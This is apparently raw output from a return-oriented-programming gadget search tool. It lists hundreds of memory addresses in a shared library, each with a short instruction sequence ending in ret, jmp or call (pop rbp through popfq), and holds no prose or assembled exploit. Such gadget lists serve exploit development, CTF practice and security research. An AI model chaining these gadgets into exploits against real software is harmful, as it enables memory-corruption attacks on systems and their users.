0x00002aaaaab72859 : pop rbp ; add dword ptr [rax], eax ; add bh, dh ; ret 0
0x00002aaaaabe45df : pop rbp ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaac6d27d : pop rbp ; add dword ptr [rax], eax ; xor al, 0x91 ; hlt ; jmp rsp
0x00002aaaaac02c8d : pop rbp ; add eax, edx ; ret
0x00002aaaaac02548 : pop rbp ; add rdi, 0x23b0 ; xor eax, eax ; jmp rcx
0x00002aaaaabe97f3 : pop rbp ; clc ; leave ; ret
0x00002aaaaac69d81 : pop rbp ; cld ; call qword ptr [rax + 0x20fffc5c]
0x00002aaaaac69bc1 : pop rbp ; cld ; call rsi
0x00002aaaaac69d7d : pop rbp ; cld ; inc dword ptr [rax] ; pop rbp ; cld ; call qword ptr [rax + 0x20fffc5c]
0x00002aaaaac69bbd : pop rbp ; cld ; inc dword ptr [rsi + 0x5d] ; cld ; call rsi
0x00002aaaaac6f801 : pop rbp ; cli ; call rsp
0x00002aaaaab1ddaa : pop rbp ; enter -0x74b8, 0x14 ; ret
0x00002aaaaac6b8e1 : pop rbp ; in eax, dx ; jmp rsp
0x00002aaaaac7dd51 : pop rbp ; int1 ; jmp qword ptr [rcx]
0x00002aaaaac4860f : pop rbp ; jmp 0x1f8ab
0x00002aaaaab46fc4 : pop rbp ; jmp rax
0x00002aaaaac00375 : pop rbp ; jmp rcx
0x00002aaaaac01b62 : pop rbp ; jmp rdx
0x00002aaaaac485ba : pop rbp ; jo 0x17360c ; mov edi, dword ptr [rbx] ; call 0x1f8af
0x00002aaaaac11b0b : pop rbp ; mov byte ptr [rax + 1], cl ; ret 0x8948
0x00002aaaaab53c45 : pop rbp ; mov dword ptr [r12 + 0x14], eax ; pop r12 ; ret
0x00002aaaaaba7dcb : pop rbp ; or eax, dword ptr [rax] ; movsxd rdx, dword ptr [rax + r14*4] ; add rax, rdx ; jmp rax
0x00002aaaaab590f9 : pop rbp ; pop r12 ; jmp rax
0x00002aaaaab5af8b : pop rbp ; pop r12 ; jmp rcx
0x00002aaaaabd6c8e : pop rbp ; pop r12 ; mov esi, 2 ; jmp rax
0x00002aaaaabd6ca8 : pop rbp ; pop r12 ; mov esi, 3 ; jmp rax
0x00002aaaaab44b6d : pop rbp ; pop r12 ; mov rax, qword ptr [rax + 0x48] ; jmp rax
0x00002aaaaac4860b : pop rbp ; pop r12 ; pop r13 ; jmp 0x1f8af
0x00002aaaaab173cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; fmul st(0) ; ret
0x00002aaaaab17349 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; fmulp st(1) ; ret
0x00002aaaaabd845a : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; jmp rax
0x00002aaaaaaf60fa : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaaaf52e2 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaaaf56c1 : pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab8aa23 : pop rbp ; pop r12 ; pop r14 ; ret
0x00002aaaaaaf4b11 : pop rbp ; pop r12 ; ret
0x00002aaaaac00f16 : pop rbp ; pop r13 ; pop r14 ; ret
0x00002aaaaab173cf : pop rbp ; pop r14 ; fmul st(0) ; ret
0x00002aaaaab1734d : pop rbp ; pop r14 ; fmulp st(1) ; ret
0x00002aaaaabd845e : pop rbp ; pop r14 ; pop r15 ; jmp rax
0x00002aaaaaaf5252 : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret
0x00002aaaaaaf60fe : pop rbp ; pop r14 ; pop r15 ; ret
0x00002aaaaaba1b05 : pop rbp ; pop r14 ; pop rbp ; ret
0x00002aaaaaaf52e6 : pop rbp ; pop r14 ; ret
0x00002aaaaab48633 : pop rbp ; pop r14 ; sar rax, 2 ; ret
0x00002aaaaab42128 : pop rbp ; pop rbp ; ret
0x00002aaaaab1d438 : pop rbp ; pop rbx ; ret
0x00002aaaaaaf4930 : pop rbp ; ret
0x00002aaaaab1ddb2 : pop rbp ; ror byte ptr [rax - 0x77], 0x14 ; ret
0x00002aaaaab4bca6 : pop rbp ; sbb al, ch ; ret
0x00002aaaaab4e15c : pop rbp ; sub rax, rdx ; ret
0x00002aaaaaba9b37 : pop rbp ; test al, 0xe8 ; ret 0xfd7a
0x00002aaaaabe7741 : pop rbp ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac75a7d : pop rbx ; add byte ptr [rax], al ; rcl ah, 1 ; in al, dx ; call rsp
0x00002aaaaab7ede8 : pop rbx ; add rax, 1 ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaac56f58 : pop rbx ; and dword ptr [rsi + rbp*2 - 0x7a], edi ; lahf ; ret 0x871e
0x00002aaaaab7f08c : pop rbx ; and eax, 0x3fc00 ; ret
0x00002aaaaab7f0bf : pop rbx ; and eax, 0x7ff80000 ; ret
0x00002aaaaabe9737 : pop rbx ; and eax, 0xc ; pop rbp ; pop r12 ; ret
0x00002aaaaac69b91 : pop rbx ; cld ; call qword ptr [rsi]
0x00002aaaaac69d51 : pop rbx ; cld ; call rax
0x00002aaaaac69cd1 : pop rbx ; cld ; jmp rsp
0x00002aaaaac69ccd : pop rbx ; cld ; push qword ptr [rbx + rbx*2 - 4] ; jmp rsp
0x00002aaaaac849c1 : pop rbx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac56f56 : pop rbx ; cmc ; pop rbx ; and dword ptr [rsi + rbp*2 - 0x7a], edi ; lahf ; ret 0x871e
0x00002aaaaab43794 : pop rbx ; div r14 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab4328e : pop rbx ; div rbp ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab448ca : pop rbx ; jmp rax
0x00002aaaaabd6379 : pop rbx ; lea rax, qword ptr [rip + 0x2c4edf] ; pop rbp ; pop r12 ; ret
0x00002aaaaab8fa8e : pop rbx ; mov dword ptr [r10 + 0xc], edi ; pop rbp ; pop r12 ; pop r14 ; ret
0x00002aaaaabed6f8 : pop rbx ; mov eax, 0xca ; pop rbp ; pop r12 ; ret
0x00002aaaaabf1530 : pop rbx ; mov eax, 0xffffffff ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab45b80 : pop rbx ; mov eax, 0xffffffff ; pop rbp ; pop r12 ; ret
0x00002aaaaab29d99 : pop rbx ; mov eax, 1 ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab45b6c : pop rbx ; mov eax, 1 ; pop rbp ; pop r12 ; ret
0x00002aaaaaba9d82 : pop rbx ; mov eax, 1 ; ret
0x00002aaaaabc40db : pop rbx ; mov eax, 5 ; pop rbp ; pop r12 ; ret
0x00002aaaaab0f725 : pop rbx ; mov eax, dword ptr [rax + 0x58] ; ret
0x00002aaaaab7f12c : pop rbx ; mov eax, eax ; ret
0x00002aaaaabfd982 : pop rbx ; mov eax, ebp ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab9e02e : pop rbx ; mov eax, edx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab1ca11 : pop rbx ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x00002aaaaabeb15e : pop rbx ; mov eax, esi ; pop rbp ; pop r12 ; ret
0x00002aaaaab467ca : pop rbx ; mov eax, r13d ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaabd08eb : pop rbx ; mov eax, r8d ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab27c8e : pop rbx ; mov eax, r8d ; pop rbp ; pop r12 ; ret
0x00002aaaaac48c49 : pop rbx ; mov esp, 0x1f0fffea ; add bl, dh ; ret
0x00002aaaaab732bd : pop rbx ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaab47220 : pop rbx ; mov rax, qword ptr [rax + 0x20] ; jmp rax
0x00002aaaaab47068 : pop rbx ; mov rax, qword ptr [rax + 0x28] ; jmp rax
0x00002aaaaab437d9 : pop rbx ; mov rax, r13 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab43ff7 : pop rbx ; mov rax, rbp ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab5beab : pop rbx ; mov rax, rcx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab44c82 : pop rbx ; mov rax, rsi ; pop rbp ; pop r12 ; ret
0x00002aaaaab5ac88 : pop rbx ; mov rsi, r12 ; pop rbp ; pop r12 ; jmp rax
0x00002aaaaac07dd4 : pop rbx ; movzx eax, al ; pop rbp ; pop r12 ; ret
0x00002aaaaaaf524e : pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00002aaaaaba1b01 : pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x00002aaaaab42124 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x00002aaaaab0e8c5 : pop rbx ; pop r12 ; pop rbp ; ret
0x00002aaaaac02c8c : pop rbx ; pop rbp ; add eax, edx ; ret
0x00002aaaaac02547 : pop rbx ; pop rbp ; add rdi, 0x23b0 ; xor eax, eax ; jmp rcx
0x00002aaaaab46fc3 : pop rbx ; pop rbp ; jmp rax
0x00002aaaaac00374 : pop rbx ; pop rbp ; jmp rcx
0x00002aaaaac01b61 : pop rbx ; pop rbp ; jmp rdx
0x00002aaaaab590f8 : pop rbx ; pop rbp ; pop r12 ; jmp rax
0x00002aaaaab5af8a : pop rbx ; pop rbp ; pop r12 ; jmp rcx
0x00002aaaaabd6c8d : pop rbx ; pop rbp ; pop r12 ; mov esi, 2 ; jmp rax
0x00002aaaaabd6ca7 : pop rbx ; pop rbp ; pop r12 ; mov esi, 3 ; jmp rax
0x00002aaaaab44b6c : pop rbx ; pop rbp ; pop r12 ; mov rax, qword ptr [rax + 0x48] ; jmp rax
0x00002aaaaac4860a : pop rbx ; pop rbp ; pop r12 ; pop r13 ; jmp 0x1f8b0
0x00002aaaaab173ca : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; fmul st(0) ; ret
0x00002aaaaab17348 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; fmulp st(1) ; ret
0x00002aaaaabd8459 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; jmp rax
0x00002aaaaaaf60f9 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaaaf52e1 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaaaf56c0 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab8aa22 : pop rbx ; pop rbp ; pop r12 ; pop r14 ; ret
0x00002aaaaaaf4b10 : pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac00f15 : pop rbx ; pop rbp ; pop r13 ; pop r14 ; ret
0x00002aaaaaaf492f : pop rbx ; pop rbp ; ret
0x00002aaaaab4e15b : pop rbx ; pop rbp ; sub rax, rdx ; ret
0x00002aaaaaaff69a : pop rbx ; ret
0x00002aaaaaad6b18 : pop rbx ; ret 0x2a63
0x00002aaaaac5a240 : pop rbx ; ret 0x6f9
0x00002aaaaac6934d : pop rbx ; sti ; jmp qword ptr [rax]
0x00002aaaaab4dfb6 : pop rbx ; sub rax, r12 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab507f8 : pop rbx ; sub rax, r14 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab506db : pop rbx ; sub rax, rbp ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab815a9 : pop rbx ; sub rax, rbp ; pop rbp ; pop r12 ; ret
0x00002aaaaabf14e5 : pop rbx ; xor eax, eax ; mov byte ptr [rdx], 0 ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab437e8 : pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaaaf4b74 : pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x00002aaaaab732ab : pop rbx ; xor edx, edx ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaac6fadd : pop rcx ; add al, byte ptr [rax] ; test cl, cl ; cli ; jmp rsp
0x00002aaaaac68730 : pop rcx ; clc ; ret 0x6e1f
0x00002aaaaab09ce0 : pop rcx ; enter 0x280f, -0x3f ; ret
0x00002aaaaac781f9 : pop rcx ; in eax, dx ; call qword ptr [rax]
0x00002aaaaac6b8b1 : pop rcx ; in eax, dx ; dec esp ; test eax, 0x59440000 ; in eax, dx ; jmp rsp
0x00002aaaaac6b8b9 : pop rcx ; in eax, dx ; jmp rsp
0x00002aaaaaafec93 : pop rcx ; lodsb al, byte ptr [rsi] ; cmp dword ptr [rax], eax ; ret
0x00002aaaaab3b2e2 : pop rcx ; or al, 0 ; add byte ptr [rax - 0x77], cl ; ret 0x348
0x00002aaaaab924b4 : pop rcx ; or eax, 0x440f4800 ; ret 0x8d48
0x00002aaaaac5b979 : pop rcx ; out dx, al ; jmp qword ptr [rsi]
0x00002aaaaac5b461 : pop rcx ; out dx, al ; jmp rax
0x00002aaaaac5b975 : pop rcx ; out dx, al ; lcall ptr [rcx + rbx*2 - 0x12] ; jmp qword ptr [rsi]
0x00002aaaaac5b971 : pop rcx ; out dx, al ; push qword ptr [rcx + rbx*2 - 0x12] ; lcall ptr [rcx + rbx*2 - 0x12] ; jmp qword ptr [rsi]
0x00002aaaaac1101f : pop rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaabd634b : pop rcx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabbeaba : pop rcx ; pop rbx ; ret
0x00002aaaaaad6b17 : pop rcx ; pop rbx ; ret 0x2a63
0x00002aaaaac5d804 : pop rcx ; push rbx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaab111af : pop rcx ; rcr byte ptr [rbp + 0x41], 0x5c ; pop r13 ; pop r14 ; ret
0x00002aaaaabd13e2 : pop rcx ; ret
0x00002aaaaab5287e : pop rcx ; sbb byte ptr [rax - 9], cl ; fisttp dword ptr [rax + 0x21] ; ret
0x00002aaaaab112c1 : pop rcx ; shl byte ptr [rdi + rax*8], 0x22 ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret
0x00002aaaaab80e33 : pop rcx ; sub dh, bh ; dec dword ptr [rax - 0x73] ; cld ; pop rbx ; ret
0x00002aaaaac021c4 : pop rcx ; sub dword ptr [rax], eax ; mov rax, qword ptr [rdx + rax*8] ; jmp rax
0x00002aaaaac259f8 : pop rdi ; adc byte ptr [rdx + 8], dh ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaabcb3e2 : pop rdi ; add byte ptr [rax], al ; add byte ptr [rax - 1], bh ; ret
0x00002aaaaac2001d : pop rdi ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaabdb82a : pop rdi ; call rax
0x00002aaaaac69bb1 : pop rdi ; cld ; call qword ptr [rsi + 0x26fffc5e]
0x00002aaaaac69ced : pop rdi ; cld ; call rsp
0x00002aaaaac69ce9 : pop rdi ; cld ; inc dword ptr [rdi + rbx*2 - 4] ; call rsp
0x00002aaaaac69bad : pop rdi ; cld ; inc dword ptr [rsi] ; pop rdi ; cld ; call qword ptr [rsi + 0x26fffc5e]
0x00002aaaaac69b6d : pop rdi ; cld ; jmp qword ptr [rax]
0x00002aaaaac69b71 : pop rdi ; cld ; push qword ptr [rax + 0x40fffc5e] ; pop rsi ; cld ; call rax
0x00002aaaaac27419 : pop rdi ; in al, dx ; mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac27229 : pop rdi ; in eax, dx ; mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac594fe : pop rdi ; insd dword ptr [rdi], dx ; test eax, 0x7d4c8c5d ; ret 0xd8f
0x00002aaaaaad88e9 : pop rdi ; ja 0x394d ; clc ; salc ; jb 0x3973 ; cmpsq qword ptr [rsi], qword ptr [rdi] ; ret 0x49ec
0x00002aaaaac74f19 : pop rdi ; jmp 0x19ff1d
0x00002aaaaac74f18 : pop rdi ; jmp 0x19ff1e
0x00002aaaaabd8462 : pop rdi ; jmp rax
0x00002aaaaac584c1 : pop rdi ; mov dh, 0x4e ; ret 0x474c
0x00002aaaaac5bc51 : pop rdi ; out dx, al ; call rsp
0x00002aaaaac5bc4d : pop rdi ; out dx, al ; dec dword ptr [rax + 0x5f] ; out dx, al ; call rsp
0x00002aaaaac5bc49 : pop rdi ; out dx, al ; dec dword ptr [rax + 0x5f] ; out dx, al ; dec dword ptr [rax + 0x5f] ; out dx, al ; call rsp
0x00002aaaaac27049 : pop rdi ; out dx, al ; mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac26e79 : pop rdi ; out dx, eax ; mov qword ptr [rdi - 9], r8 ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac26f75 : pop rdi ; out dx, eax ; mov qword ptr [rdi - 9], rcx ; mov byte ptr [rdi - 1], dl ; ret
0x00002aaaaac26ec1 : pop rdi ; out dx, eax ; mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaaaf5256 : pop rdi ; pop rbp ; ret
0x00002aaaaaaf6102 : pop rdi ; ret
0x00002aaaaab3c499 : pop rdi ; ret 0xffff
0x00002aaaaac02c42 : pop rdi ; sbb byte ptr [rbx - 0x73fa17c5], cl ; std ; dec dword ptr [rax - 0x77] ; ret 0xffb8
0x00002aaaaab9bcd5 : pop rdx ; adc byte ptr [rdi - 0x36], bh ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaabe50fe : pop rdx ; add dword ptr [rax], eax ; add byte ptr [rcx], bh ; ret
0x00002aaaaac1a906 : pop rdx ; add eax, 0x83480000 ; ret 0x4910
0x00002aaaaac84961 : pop rdx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaaad8a9e : pop rdx ; int1 ; imul esi ; in eax, 0x78 ; mov dl, 0x1e ; ret
0x00002aaaaac590e1 : pop rdx ; je 0x1840ab ; ret 0xacfc
0x00002aaaaaad8185 : pop rdx ; jmp 0xffffffff88c2d332
0x00002aaaaab80cd3 : pop rdx ; or al, 0 ; ret
0x00002aaaaac5a0a7 : pop rdx ; out -0xb, eax ; mov ch, 0xab ; ret
0x00002aaaaac5b489 : pop rdx ; out dx, al ; inc dword ptr [rax + 0x5a] ; out dx, al ; inc dword ptr [rax + 0x5a] ; out dx, al ; jmp qword ptr [rax]
0x00002aaaaac5b48d : pop rdx ; out dx, al ; inc dword ptr [rax + 0x5a] ; out dx, al ; jmp qword ptr [rax]
0x00002aaaaac5b491 : pop rdx ; out dx, al ; jmp qword ptr [rax]
0x00002aaaaabe94b4 : pop rdx ; pop r10 ; ret
0x00002aaaaabd640c : pop rdx ; pop rbx ; ret
0x00002aaaaac1101e : pop rdx ; pop rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaabbeab9 : pop rdx ; pop rcx ; pop rbx ; ret
0x00002aaaaabe94d9 : pop rdx ; pop rsi ; ret
0x00002aaaaaad6b92 : pop rdx ; ret
0x00002aaaaac59c10 : pop rdx ; sub ah, ah ; mov bh, 6 ; movsd dword ptr [rdi], dword ptr [rsi] ; int1 ; ret 0x5803
0x00002aaaaabe93d2 : pop rdx ; sub eax, dword ptr [r8] ; test eax, eax ; jne 0x1143ea ; xor eax, eax ; ret
0x00002aaaaabe90d2 : pop rdx ; sub r8d, dword ptr [rax] ; test eax, eax ; jne 0x1140ea ; xor eax, eax ; ret
0x00002aaaaab809c5 : pop rdx ; test al, 0xf0 ; jne 0xab9f9 ; lea rax, qword ptr [rdi - 0x10] ; ret
0x00002aaaaac1ff1e : pop rsi ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaab5c03e : pop rsi ; add dword ptr [rax], eax ; add byte ptr [rcx + rcx*4 - 0x1e], cl ; mov rdi, r15 ; call rax
0x00002aaaaabf854c : pop rsi ; add ebx, dword ptr [rbx - 0x3d] ; mov eax, 0xffffffff ; ret
0x00002aaaaabdd76c : pop rsi ; add ecx, dword ptr [rax - 0x42] ; ret
0x00002aaaaac69c35 : pop rsi ; cld ; call qword ptr [rdx]
0x00002aaaaac69b79 : pop rsi ; cld ; call rax
0x00002aaaaac69b75 : pop rsi ; cld ; inc dword ptr [rax + 0x5e] ; cld ; call rax
0x00002aaaaac69bb5 : pop rsi ; cld ; jmp qword ptr [rsi]
0x00002aaaaac69d75 : pop rsi ; cld ; jmp rax
0x00002aaaaac69bb9 : pop rsi ; cld ; push qword ptr [rsi + 0x46fffc5d] ; pop rbp ; cld ; call rsi
0x00002aaaaaba230e : pop rsi ; fdivr st(3) ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaab173d1 : pop rsi ; fmul st(0) ; ret
0x00002aaaaab1734f : pop rsi ; fmulp st(1) ; ret
0x00002aaaaac5d128 : pop rsi ; lodsd eax, dword ptr [rsi] ; jmp qword ptr [rdx]
0x00002aaaaac69550 : pop rsi ; mov bh, 0xfd ; call rcx
0x00002aaaaaba9dec : pop rsi ; or byte ptr [r14], r11b ; mov eax, 2 ; ret
0x00002aaaaab68ef5 : pop rsi ; or byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaac5bbbd : pop rsi ; out dx, al ; call rsp
0x00002aaaaac5bbb5 : pop rsi ; out dx, al ; dec eax ; pop rsi ; out dx, al ; inc dword ptr [rax + 0x5e] ; out dx, al ; call rsp
0x00002aaaaac5bbb9 : pop rsi ; out dx, al ; inc dword ptr [rax + 0x5e] ; out dx, al ; call rsp
0x00002aaaaac5ba0d : pop rsi ; out dx, al ; jmp qword ptr [rsi]
0x00002aaaaabd8460 : pop rsi ; pop r15 ; jmp rax
0x00002aaaaaaf5254 : pop rsi ; pop r15 ; pop rbp ; ret
0x00002aaaaaaf6100 : pop rsi ; pop r15 ; ret
0x00002aaaaaba1b07 : pop rsi ; pop rbp ; ret
0x00002aaaaaaf52e8 : pop rsi ; ret
0x00002aaaaabd61cb : pop rsi ; ret 0xcdbb
0x00002aaaaab205fe : pop rsi ; sahf ; adc eax, dword ptr [rax] ; movsxd rax, dword ptr [rax + rdx*4] ; add rax, rdi ; jmp rax
0x00002aaaaab48635 : pop rsi ; sar rax, 2 ; ret
0x00002aaaaabcd4e5 : pop rsi ; sbb byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaac1b750 : pop rsp ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac6c614 : pop rsp ; add al, 1 ; add byte ptr [rsp + rdx*4], dh ; out dx, eax ; call rsp
0x00002aaaaac1ac04 : pop rsp ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac6fb4d : pop rsp ; add al, byte ptr [rax] ; in al, -0x2a ; cli ; call rsp
0x00002aaaaac79cb8 : pop rsp ; add byte ptr [rax], al ; add byte ptr [rbp + rbx*4 + 0x1900000], al ; out dx, al ; call qword ptr [rsi]
0x00002aaaaac79a58 : pop rsp ; add byte ptr [rax], al ; add byte ptr [rbx + rbx*4], ah ; add byte ptr [rax], al ; mov al, 0xf0 ; in eax, dx ; call rsi
0x00002aaaaac8a3d0 : pop rsp ; add byte ptr [rax], al ; add byte ptr [rsp - 0xe57ffff], bl ; sti ; call rcx
0x00002aaaaac78094 : pop rsp ; add dword ptr [rax], 0xed52a800 ; jmp qword ptr [rsi]
0x00002aaaaabad9b2 : pop rsp ; add eax, 0x83077500 ; rol byte ptr [rcx], 0x39 ; ret 0xe875
0x00002aaaaac1c450 : pop rsp ; add eax, 0x83480000 ; ret 0xe910
0x00002aaaaab55d08 : pop rsp ; and al, 0x28 ; mov rdi, r15 ; mov qword ptr [rsp + 0x20], r10 ; call qword ptr [rax]
0x00002aaaaab8fd45 : pop rsp ; and al, 0xf0 ; movsd xmm0, qword ptr [rsp - 0x10] ; ret
0x00002aaaaac69b89 : pop rsp ; cld ; call qword ptr [rax]
0x00002aaaaac69cc9 : pop rsp ; cld ; dec esi ; pop rbx ; cld ; push qword ptr [rbx + rbx*2 - 4] ; jmp rsp
0x00002aaaaac69d85 : pop rsp ; cld ; jmp qword ptr [rax]
0x00002aaaaac69b8d : pop rsp ; cld ; jmp qword ptr [rsi + 0x16fffc5b]
0x00002aaaaac69c49 : pop rsp ; cld ; jmp rdx
0x00002aaaaac69d89 : pop rsp ; cld ; push qword ptr [rax + 0x50fffc5b] ; push rcx ; cld ; call qword ptr [rax]
0x00002aaaaac8d994 : pop rsp ; fiadd dword ptr [rcx] ; add byte ptr [rax], bh ; fdivrp st(7) ; jmp rdi
0x00002aaaaac6b8d9 : pop rsp ; in eax, dx ; lcall ptr [rdx + rbp*4 + 0x5d740000] ; in eax, dx ; jmp rsp
0x00002aaaaac6c951 : pop rsp ; int1 ; call rsp
0x00002aaaaac5ec70 : pop rsp ; jle 0x189c6c ; jmp rdx
0x00002aaaaac74e61 : pop rsp ; jmp 0x19fe65
0x00002aaaaab590fb : pop rsp ; jmp rax
0x00002aaaaab5af8d : pop rsp ; jmp rcx
0x00002aaaaab4a4c3 : pop rsp ; jne 0x754db ; mov edx, dword ptr [rdi + 0xc0] ; mov eax, edx ; ret
0x00002aaaaac6e32c : pop rsp ; mov bl, 1 ; add byte ptr [rbp + rdx*2 - 9], dh ; call rsp
0x00002aaaaac5cbb4 : pop rsp ; mov dr0, ebx ; jmp rdx
0x00002aaaaabd6c90 : pop rsp ; mov esi, 2 ; jmp rax
0x00002aaaaabd6caa : pop rsp ; mov esi, 3 ; jmp rax
0x00002aaaaab44b6f : pop rsp ; mov rax, qword ptr [rax + 0x48] ; jmp rax
0x00002aaaaac195e0 : pop rsp ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac0ebf1 : pop rsp ; out dx, al ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac86e94 : pop rsp ; outsd dx, dword ptr [rsi] ; add dword ptr [rax], eax ; cwde ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac4860d : pop rsp ; pop r13 ; jmp 0x1f8ad
0x00002aaaaab173cd : pop rsp ; pop r13 ; pop r14 ; fmul st(0) ; ret
0x00002aaaaab1734b : pop rsp ; pop r13 ; pop r14 ; fmulp st(1) ; ret
0x00002aaaaabd845c : pop rsp ; pop r13 ; pop r14 ; pop r15 ; jmp rax
0x00002aaaaaaf5250 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00002aaaaaaf60fc : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaaba1b03 : pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret
0x00002aaaaaaf52e4 : pop rsp ; pop r13 ; pop r14 ; ret
0x00002aaaaab48631 : pop rsp ; pop r13 ; pop r14 ; sar rax, 2 ; ret
0x00002aaaaab42126 : pop rsp ; pop r13 ; pop rbp ; ret
0x00002aaaaaaf56c3 : pop rsp ; pop r13 ; ret
0x00002aaaaab8aa25 : pop rsp ; pop r14 ; ret
0x00002aaaaab0e8c7 : pop rsp ; pop rbp ; ret
0x00002aaaaac5b978 : pop rsp ; pop rcx ; out dx, al ; jmp qword ptr [rsi]
0x00002aaaaac74f94 : pop rsp ; push rax ; add byte ptr [rax], al ; pop rax ; mov dh, 0xeb ; jmp qword ptr [rax]
0x00002aaaaac85594 : pop rsp ; push rsi ; add dword ptr [rax], eax ; call 0x221afb1e
0x00002aaaaaad8838 : pop rsp ; ret
0x00002aaaaabf01d8 : pop rsp ; ret 0x2a
0x00002aaaaaad818d : pop rsp ; ret 0x52c0
0x00002aaaaac69311 : pop rsp ; sti ; jmp rax
0x00002aaaaac72994 : pop rsp ; sub al, byte ptr [rax] ; add al, bh ; mov cl, ch ; jmp rsp
0x00002aaaaac83394 : pop rsp ; xor al, 1 ; add byte ptr [rax], bh ; in al, dx ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac6b6f5 : popfq ; add byte ptr [rax], al ; and al, 0x50 ; jmp 0x196701
0x00002aaaaac79cbd : popfq ; add byte ptr [rax], al ; nop ; add esi, ebp ; call qword ptr [rsi]
0x00002aaaaac89c7d : popfq ; add dword ptr [rax], eax ; adc bh, 0xf6 ; call qword ptr [rdi]
0x00002aaaaac6ddad : popfq ; add dword ptr [rax], eax ; push rsp ; div esi ; call rsp
0x00002aaaaac302a7 : popfq ; add eax, dword ptr [rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac8277e : popfq ; add ecx, dword ptr [rdx] ; ret
0x00002aaaaac6a811 : popfq ; cld ; call rdx
0x00002aaaaac6a84d : popfq ; cld ; jmp qword ptr [rdx]
0x00002aaaaac6a98d : popfq ; cld ; push rax ; pushfq ; cld ; call qword ptr [rax + 0x10fffca4]
0x00002aaaaac694d0 : popfq ; mov ch, 0xfd ; call rcx
0x00002aaaaabf2b2b : popfq ; or eax, dword ptr [rdi] ; add byte ptr [rax - 0x77], cl ; ret 0xff31
0x00002aaaaab9d9ff : popfq ; outsb dx, byte ptr [rsi] ; cmc ; dec dword ptr [rax - 0x77] ; ret 0x8948
